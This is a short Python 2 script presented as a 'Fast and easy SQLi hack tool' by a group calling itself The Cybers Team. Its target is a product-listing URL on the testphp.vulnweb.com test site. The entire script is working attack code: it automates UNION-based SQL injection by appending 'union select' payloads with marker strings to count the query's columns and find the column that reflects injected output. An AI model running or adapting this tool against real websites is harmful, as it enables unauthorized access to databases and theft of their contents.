import subprocess as sp
import urllib as cybers
sp.call('cls',shell=True)
header="""
____ _              ___      _                     _____                      
/__   \ |__   ___    / __\   _| |__   ___ _ __ ___  /__   \___  __ _ _ __ ___  
  / /\/ '_ \ / _ \  / / | | | | '_ \ / _ \ '__/ __|   / /\/ _ \/ _` | '_ ` _ \ 
 / /  | | | |  __/ / /__| |_| | |_) |  __/ |  \__ \  / / |  __/ (_| | | | | | |
 \/   |_| |_|\___| \____/\__, |_.__/ \___|_|  |___/  \/   \___|\__,_|_| |_| |_|
                         |___/                                                 

More: https://www.facebook.com/TheCybersTeam
Fast and easy SQLi hack tool Beta 0.4
"""
print header

url = "http://testphp.vulnweb.com/listproducts.php?cat="

def getContent(url):
    res = cybers.urlopen(url)
    return res.read()

def countColumns(url):
    key = "Th3Cyb3rsT34m"
    print "Start Count Columns..."
    url = url + "-1 union select "
    start = 1
    finish = 50

    for i in range(start,finish):
        if i != start and i != finish:
            url = url + ", "

        url = url + "'"+key+"'"
        res = getContent(url)
        
        if res.find(key) !=-1:
            return i
            break
    return 0

columns = countColumns(url)
print "Columns: " + str(columns)

def getVulColumns(columns, url):
    columns = columns + 1
    key = "Th3Cyb3rsT34m"
    inject = "666Th3Cyb3rsTeam666"
    for i in range(1, columns):
        linha = "-1 union select "
        for j in range(1, columns):
            if j != 1 and j != columns:
                linha = linha + ", "

            if i == j:
                linha+="'"+inject+"'"
            else:
                linha+="'"+key+"'"

        res = getContent(url + linha)
        if res.find(inject) !=-1:
            return i
            break
    return 0

vulCol = getVulColumns(columns,url)
print "Vul Column: " +str(vulCol)


